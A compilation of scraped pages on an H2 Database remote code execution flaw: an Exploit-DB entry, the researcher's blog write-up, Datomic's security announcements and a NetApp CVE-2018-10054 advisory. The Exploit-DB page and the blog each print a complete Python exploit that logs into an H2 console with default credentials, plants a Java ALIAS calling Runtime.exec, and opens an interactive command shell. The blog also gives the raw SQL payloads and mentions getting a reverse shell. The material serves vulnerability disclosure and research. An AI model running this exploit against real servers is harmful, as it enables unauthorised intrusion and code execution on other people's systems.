=== Content from www.exploit-db.com_89076326_20250110_111425.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# H2 Database - 'Alias' Arbitrary Code Execution

#### EDB-ID:

###### 44422

#### CVE:

###### N/A

---

**EDB Verified:**

#### Author:

###### [gambler](/?author=9018)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Java](/?platform=java)

#### Date:

###### 2018-04-09

---

**Vulnerable App:**

```
'''
Exploit Title: H2 Database Alias Abuse
Date: 05/04/2018
Exploit Author: gambler
Vendor Homepage:www.h2database.com
Software Link: http://www.h2database.com/html/download.html
Version: all versions
Tested on: Linux, Mac OS
'''

import sys
import argparse
import html
import requests

# Blogpost about it
# https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html

def getCookie(host):
    url = 'http://{}'.format(host)
    r = requests.get(url)
    path = r.text.split('href = ')[1].split(';')[0].replace("'","").replace('.jsp','.do')
    return '{}/{}'.format(url,path)

def login(url,user,passwd,database):
    data = {'language':'en','setting':'Generic+H2+(Embedded)','name':'Generic+H2+(Embedded)','driver':'org.h2.Driver','url':database,'user':user,'password':passwd}
    r = requests.post(url,data=data)
    if '<th class="login">Login</th>' in r.text:
        return False
    return True

def prepare(url):
    cmd = '''CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;'''
    url = url.replace('login','query')
    r = requests.post(url,data={'sql':cmd})
    if not 'Syntax error' in r.text:
        return url
    return False

def execve(url,cmd):
    r = requests.post(url,data={'sql':"CALL EXECVE('{}')".format(cmd)})
    try:
        print(html.unescape(r.text.split('</th></tr><tr><td>')[1].split('</td>')[0].replace('<br />','\n').replace('&nbsp;',' ')).encode('utf-8').decode('utf-8','ignore'))
    except Exception as e:
        print('Something goes wrong')
        print(e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    required = parser.add_argument_group('required arguments')
    required.add_argument("-H",
            "--host",
            metavar='127.0.0.1:4336',
            help="Specify a host",
            required=True)
    required.add_argument("-d",
            "--database-url",
            metavar='jdbc:h2~/test',
            default="jdbc:h2~/test",
            help="Database URL",
            required=False)
    required.add_argument("-u",
            "--user",
            metavar='username',
            default="sa",
            help="Username to log on H2 Database, default sa",
            required=False)
    required.add_argument("-p",
            "--password",
            metavar='password',
            default="",
            help="Password to log on H2 Database, default None",
            required=False)
    args = parser.parse_args()

url = getCookie(args.host)
if login(url,args.user,args.password,args.database_url):
    url = prepare(url)
    if url:
        while 1:
            try:
                cmd = input('cmdline@ ')
                execve(url,cmd)
            except KeyboardInterrupt:
                print("\nProfessores ensinam, nadadores Nadam e Hackers Hackeiam")
                sys.exit(0)
    else:
        print('ERROR - Inserting Payload')
        print("Something goes wrong, exiting...")
else:
    print("ERROR - Auth")
    print("Something goes wrong, exiting...")

```

**Tags:**

**Advisory/Source:**
[Link](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from forum.datomic.com_4e68350f_20250110_111419.html ===


[Datomic Developers](/)

# [Important Security Update 0.9.5697](/t/important-security-update-0-9-5697/379)

[General](/c/datomic-gen/announcements/6)

[Announcements](/c/datomic-gen/announcements/6)

[stu](https://forum.datomic.com/u/stu)

March 28, 2018, 6:21pm

1

Release 0.9.5697 fixes two security vulnerabilities in Datomic On-Prem transactors running the free: or dev: storage protocol.

The transactor running the free: or dev: storage protocol currently:

1. runs a JDBC server and an H2 web console that are accessible by remote clients
2. has admin and datomic JDBC users with default passwords

This can allow unauthorized users to access data, and, via the H2 SQL ALIAS command, execute arbitrary Java code.

## What You Need To Do

If you are running free: or dev: storage, you need to upgrade as soon as possible. Log into [my.datomic.com](http://my.datomic.com) and download version 0.9.5697 for immediate installation. For any help or additional questions please contact our [support team](http://mailto:support@datomic.com).

All other storages are unaffected.

## What Has Changed

Release 0.9.5697 makes the following changes to free: and dev: transactors:

1. Transactors no longer run an H2 console under any configuration.
2. By default, the JDBC server is now open only to connections on the same computer.
3. To open the JDBC server to external connections, you must explicitly enable it via a property setting and also set passwords for the ‘admin’ and ‘datomic’ users.
4. To connect from non-local peers, the peers must now supply the password (for the ‘datomic’ user) in the connection URI

The [Configuring Embedded Storage](https://docs.datomic.com/on-prem/configuring-embedded.html) documentation describes the new configuration options in more detail.

The Datomic team would like to thank Caio Vargas, Matheus Bernardes, and Nubank for reporting this issue.

### Related topics

| Topic |  | Replies | Views | Activity |
| --- | --- | --- | --- | --- |
| [H2: datomic.h2.db vs. datomic.mv.db](https://forum.datomic.com/t/h2-datomic-h2-db-vs-datomic-mv-db/2295)  [General](/c/datomic-gen/7) | 2 | 266 | July 12, 2023 |
| [Datomic 1.0.6344 now available](https://forum.datomic.com/t/datomic-1-0-6344-now-available/1944)  [Announcements](/c/datomic-gen/announcements/6) | 0 | 1139 | September 2, 2021 |
| [Datomic 0.9.5981 now available](https://forum.datomic.com/t/datomic-0-9-5981-now-available/1213)  [Announcements](/c/datomic-gen/announcements/6) | 0 | 1152 | October 21, 2019 |
| [High severity vulnerabilities in datomic transactor](https://forum.datomic.com/t/high-severity-vulnerabilities-in-datomic-transactor/2144)  [Datomic Pro](/c/datomic-pro/13) | 4 | 597 | October 22, 2022 |
| [Unable to connect to transactor from/to EC2 instances](https://forum.datomic.com/t/unable-to-connect-to-transactor-from-to-ec2-instances/568)  [Troubleshooting](/c/datomic-pro/troubleshooting/15) | 1 | 2319 | August 4, 2018 |

* [Home](/)
* [Categories](/categories)
* [Guidelines](/guidelines)
* [Terms of Service](/tos)
* [Privacy Policy](/privacy)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled

* Datomic Developers Forum
* [Datomic.com](http://www.datomic.com/)



=== Content from mthbernardes.github.io_82d1370e_20250110_111424.html ===

Home
[Subscribe](feed.xml)

# Abusing H2 Database ALIAS

14 Mar 2018
on RCE

#### How to get a shell on a H2 Database, using ALIAS feature.

Today I was introduced to [H2 Database](http://www.h2database.com), a in-memory and pure Java Database, because it’s a in-memory database, the developers use it most to learning, unit tests and poc’s, but you can learn more about it on H2 [site](2018-03-14-abusing-h2-database-alias.markdown).

The H2 provides a web console, where you can manage your database, and here the things starts to be more interesting, by default it does not have an password set, so you can just log in, but what can we do inside it? The first thing I tried was the same trick that everyone knows on MySQL.

```
SELECT 'SOME CONTENT' INTO OUTFILE '/tmp/saida.txt'

```

And of course it didn’t work, so I decided to be more smart and google it, trying to discover if anybody already find some RCE on it, and the maximum I found was a report made by the H2 Group on [SecurityFocus](%27https%3A//www.securityfocus.com/bid/58536%27), but there wasn’t an available exploit or any technical detail.

So after it I did the most obvious thing, open the H2 site, go to the documentation, and tried to find any interesting function, the first thing I found was the [FILE\_READ](http://www.h2database.com/html/functions.html?highlight=FILE_READ&search=FILE_#file_read) function, where I can read files from filesystem, Ok, cool, it’s a nice thing to do, but it’s not a shell, so digging on SQL commands section, I found the [CREATE ALIAS](http://www.h2database.com/html/grammar.html#create_alias), basically, you can create an function on H2 that calls a java code, as the example

```
CREATE ALIAS GET_SYSTEM_PROPERTY FOR "java.lang.System.getProperty";
CALL GET_SYSTEM_PROPERTY('java.class.path');

```

or a more complex alias,

```
CREATE ALIAS REVERSE AS $$ String reverse(String s) { return new StringBuilder(s).reverse().toString(); } $$;
CALL REVERSE('Test');

```

Now it’s game over, if I can execute Java code, I can get a shell, as I’m not a Java expert, I searchon Google a easy way to execute system commands with java, found a link on [stackoverflow](https://stackoverflow.com/a/20624914), I just adapted it inside the ALIAS, and now there’s a function that execute arbitrary code,

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('id')

```

After that just find if the server have any tool to do a [reverse shell](https://github.com/mthbernardes/rsg), and you’ll gain a interactive shell.

![h2-console-rce](/assets/images/h2-console-rce.gif)

#### Attack Scenario

One scenario is a distributed database called Datomic. The free version of Datomic uses an embedded H2 storage, and older versions of Datomic enabled the H2 console with the default blank H2 password. The free version is often used locally by developers for quick prototyping, thus unauthenticated local attackers can easily compromise their machines. The issue was disclosed to the Datomic team and was quickly [fixed](http://blog.datomic.com/2018/03/important-security-update.html).

#### Datomic Timeline

2018-03-14 - Initial Vulnerability discovery

2018-03-20 - First contact with Datomic team

2018-03-29 - Fix released

2018-04-05 - Blog published.

#### Exploit

```
import sys
import argparse
import html
import requests

def getCookie(host):
    url = 'http://{}'.format(host)
    r = requests.get(url)
    path = r.text.split('href = ')[1].split(';')[0].replace("'","").replace('.jsp','.do')
    return '{}/{}'.format(url,path)

def login(url,user,passwd,database):
    data = {'language':'en','setting':'Generic+H2+(Embedded)','name':'Generic+H2+(Embedded)','driver':'org.h2.Driver','url':database,'user':user,'password':passwd}
    r = requests.post(url,data=data)
    if '<th class="login">Login</th>' in r.text:
        return False
    return True

def prepare(url):
    cmd = '''CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;'''
    url = url.replace('login','query')
    r = requests.post(url,data={'sql':cmd})
    if not 'Syntax error' in r.text:
        return url
    return False

def execve(url,cmd):
    r = requests.post(url,data={'sql':"CALL EXECVE('{}')".format(cmd)})
    try:
        print(html.unescape(r.text.split('</th></tr><tr><td>')[1].split('</td>')[0].replace('<br />','\n').replace('&nbsp;',' ')).encode('utf-8').decode('utf-8','ignore'))
    except Exception as e:
        print('Something goes wrong')
        print(e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    required = parser.add_argument_group('required arguments')
    required.add_argument("-H",
            "--host",
            metavar='127.0.0.1:4336',
            help="Specify a host",
            required=True)
    required.add_argument("-d",
            "--database-url",
            metavar='jdbc:h2~/test',
            default="jdbc:h2~/test",
            help="Database URL",
            required=False)
    required.add_argument("-u",
            "--user",
            metavar='username',
            default="sa",
            help="Username to log on H2 Database, default sa",
            required=False)
    required.add_argument("-p",
            "--password",
            metavar='password',
            default="",
            help="Password to log on H2 Database, default None",
            required=False)
    args = parser.parse_args()

url = getCookie(args.host)
if login(url,args.user,args.password,args.database_url):
    url = prepare(url)
    if url:
        while 1:
            try:
                cmd = input('cmdline@ ')
                execve(url,cmd)
            except KeyboardInterrupt:
                print("\nProfessores ensinam, nadadores Nadam e Hackers Hackeiam")
                sys.exit(0)
    else:
        print('ERROR - Inserting Payload')
        print("Something goes wrong, exiting...")
else:
    print("ERROR - Auth")
    print("Something goes wrong, exiting...")

```

Matheus Bernardes's Picture

#### Matheus Bernardes

Just another security engineer.

#### Share this post

[Twitter](http://twitter.com/share?text=Abusing H2 Database ALIAS&url=mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)
[Facebook](https://www.facebook.com/sharer/sharer.php?u=mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)
[Google+](https://plus.google.com/share?url=mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)

Please enable JavaScript to view the [comments powered by Disqus.](http://disqus.com/?ref_noscript)
[comments powered by Disqus](http://disqus.com)

Gambler ©
2021 • All rights reserved.

Made with Jekyll using
[Kasper theme](http://github.com/rosario/kasper)



=== Content from blog.datomic.com_51904334_20250110_111419.html ===


[Datomic Pro](https://blog.datomic.com/2023/04/datomic-is-free.html)
and
[Datomic Cloud are FREE!](https://blog.datomic.com/2023/06/datomic-cloud-is-free.html)

[![](https://www.datomic.com/images/datomic-logo-160x130.png)](https://www.datomic.com/index.html)
[Products](https://www.datomic.com/products.html)

[Datomic Pro](https://www.datomic.com/index.html)[Datomic Cloud](https://www.datomic.com/cloud.html)

[Support Pricing](https://www.datomic.com/get-datomic.html)

[Datomic Pro Pricing](https://www.datomic.com/get-datomic.html)[Datomic Cloud Pricing](https://www.datomic.com/get-datomiccloud.html)

[Resources](https://www.datomic.com/support.html)

[Datomic Docs](https://docs.datomic.com/)

---

[Product Support](https://www.datomic.com/support.html)
[Videos](https://www.datomic.com/videos.html)
[Blog](https://blog.datomic.com/blog.html)
[Knowledgebase](https://ask.datomic.com)

[Company](https://www.datomic.com/contact.html)

[Contact](https://www.datomic.com/contact.html)[Customers](https://www.datomic.com/customers.html)

[Careers](https://international.nubank.com.br/careers/)

[Get Datomic Pro](https://docs.datomic.com/setup/pro-setup.html#get-datomic)

* [Datomic Blog](https://blog.datomic.com/blog.html) ›
* Important Security Update For free: and dev: Storage Protocols
* [![](https://www.datomic.com/images/Feed-icon.svg)](https://www.datomic.com/feed.xml)

Recent Posts
[Amazing Day of Datomic](../../2024/09/Amazing-Day-of-Datomic.html)
[Jepsen Tests Datomic](../../2024/05/Jepsen-tests-Datomic.html)
[Datomic Local is Released](../../2023/08/datomic-local-is-released.html)
[Datomic Cloud is Free](../../2023/06/datomic-cloud-is-free.html)
[Datomic is Free](../../2023/04/datomic-is-free.html)
[Implicit Partitions](../../2023/04/implicit-partitions.html)

# Important Security Update For free: and dev: Storage Protocols

*01 March 2018*

Release 0.9.5697 fixes two security vulnerabilities in Datomic On-Prem transactors running the free: or dev: storage protocol.

For more information, see the [release announcement](https://forum.datomic.com/t/important-security-update-0-9-5697/379).

The Datomic team would like to thank Caio Vargas, Matheus Bernardes, and Nubank for reporting this issue.

---

![](https://www.datomic.com/images/datomic-logo-290x230.png)

###### [Datomic Pro](https://www.datomic.com/index.html)

[Benefits](https://www.datomic.com/benefits.html)
[Get Datomic](https://docs.datomic.com/getting-started/get-datomic.html)
[Documentation](https://docs.datomic.com/)
[Release Notes](https://docs.datomic.com/changes.html)
[Apache License](https://www.datomic.com/on-prem-eula.html)

###### [Datomic Cloud](https://www.datomic.com/cloud.html)

[Product Details](https://www.datomic.com/details.html)
[Support Pricing](https://www.datomic.com/get-datomiccloud.html)
[Documentation](https://docs.datomic.com/)
[Release Notes](https://docs.datomic.com/changes.html)
[Apache License](https://www.datomic.com/cloud-eula.html)

###### Resources

[Blog](http://blog.datomic.com/)
[Knowledgbase](https://ask.datomic.com)
[Developer Forum](https://forum.datomic.com/)
[Product Support](https://www.datomic.com/support.html)

###### Company

[About Us](https://international.nubank.com.br/about/)[Contact](https://www.datomic.com/contact.html)

![](https://www.datomic.com/images/cognitect-logo-290x90.png)

Â©2016-2021 Cognitect, Inc.

DatomicÂ® is a registered trademark of Cognitect, Inc.

[Trademark Guidelines](trademark-guidelines.html) | [Privacy Policy](/privacy-policy.html)



=== Content from lists.apache.org_0b6693a3_20250110_111423.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from security.netapp.com_12671be8_20250110_111424.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [CVE-2018-10054 H2 Database Vulnerability in NetApp Products](https://security.netapp.com/advisory/ntap-20240719-0003)

## CVE-2018-10054 H2 Database Vulnerability in NetApp Products

circle-info

NetApp will continue to update this advisory as additional information becomes available.

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20240719-0003 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20240719-0003 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20240719-0003 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20240719-0003 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20240719-0003
**Version:**
4.0

**Last updated:**
10/30/2024

**Status:**
Interim.

**CVEs:** CVE-2018-10054

Overview
#### Summary

Multiple NetApp products incorporate H2 Database. H2 Database version 1.4.197 is susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2018-10054](https://nvd.nist.gov/vuln/detail/CVE-2018-10054) | 8.8 (HIGH) | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

Affected Products
#### Affected Products

* Brocade SAN Navigator (SANnav)

#### Products Not Affected

* AFF BIOS - A1K/A70/A90
* AFF BIOS - A700s
* AFF Baseboard Management Controller (BMC) - A1K/A70/A90
* AFF Baseboard Management Controller (BMC) - A700s
* AFF LOADER- A1K/A70/A90
* ATTO FibreBridge - 7600N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ Unified Manager for VMware vSphere
* Active IQ mobile app
* Astra Control Center
* Astra Control Center - NetApp Kubernetes Monitoring Operator
* Astra Control Provisioner
* Astra Trident
* Astra Trident Autosupport
* BlueXP Classification
* Brocade Fabric Operating System Firmware
* Cloud Volumes ONTAP Mediator
* Data Infrastructure Insights Acquisition Unit (formerly Cloud Insights Acquisition Unit)
* Data Infrastructure Insights Storage Workload Security Agent (formerly Cloud Insights Storage Workload Security Agent)
* Data Infrastructure Insights Telegraf Agent (formerly Cloud Insights Telegraf Agent)
* E-Series BIOS
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element .NET SDK
* Element HealthTools
* Element JAVA SDK
* Element Plug-in for vCenter Server
* Element Powershell Tools
* Element Python SDK
* FAS/AFF BIOS - 2820
* FAS/AFF BIOS - 8300/8700/A400/C400
* FAS/AFF BIOS - A250/500f/C250
* FAS/AFF BIOS - A300/8200/C190/A220/2720/2750/A150
* FAS/AFF BIOS - A320
* FAS/AFF BIOS - A700/9000
* FAS/AFF BIOS - A800/C800
* FAS/AFF BIOS - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250
* FAS/AFF Baseboard Management Controller (BMC) - A320
* FAS/AFF Baseboard Management Controller (BMC) - A800/C800
* FAS/AFF Baseboard Management Controller (BMC) - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - C190/A150/A220/FAS2720/FAS2750
* FAS/AFF Baseboard Management Controller (BMC) - FAS2820
* FAS/AFF Service Processor - A300/8200
* FAS/AFF Service Processor - A700/9000
* Global File Cache
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* IOM12 SAS Disk Shelf Firmware
* IOM12B SAS Disk Shelf Firmware
* IOM12E SAS Disk Shelf Firmware
* IOM12F SAS Disk Shelf Firmware
* IOM12G SAS Disk Shelf Firmware
* IOM6 SAS Disk Shelf Firmware
* IOM6E SAS Disk Shelf Firmware
* Management Services for Element Software and NetApp HCI
* MetroCluster DataCollector
* MetroCluster Tiebreaker
* Multipath I/O (SANtricity DSM for Windows MPIO)
* NetApp BlueXP
* NetApp Converged Systems Advisor Agent
* NetApp DataOps Toolkit
* NetApp E-Series Host Collection
* NetApp E-Series SANtricity Collection
* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S
* NetApp HCI Baseboard Management Controller (BMC) - H410C
* NetApp HCI Baseboard Management Controller (BMC) - H610C
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp HCI Baseboard Management Controller (BMC) - H615C
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Node BIOS
* NetApp Kubernetes Monitoring Operator
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp ONTAP PowerShell Toolkit (PSTK)
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)
* NetApp SolidFire Plug-in for vRealize Orchestrator (SolidFire vRO)
* NetApp XCP NFS
* NetApp XCP SMB
* ONTAP 9
* ONTAP Antivirus Connector
* ONTAP Mediator
* ONTAP Select Deploy administration utility
* ONTAP tools for VMware vSphere 10
* ONTAP tools for VMware vSphere 9
* OnCommand Insight
* OnCommand Workflow Automation
* RcfFileGenerator for MetroCluster IP
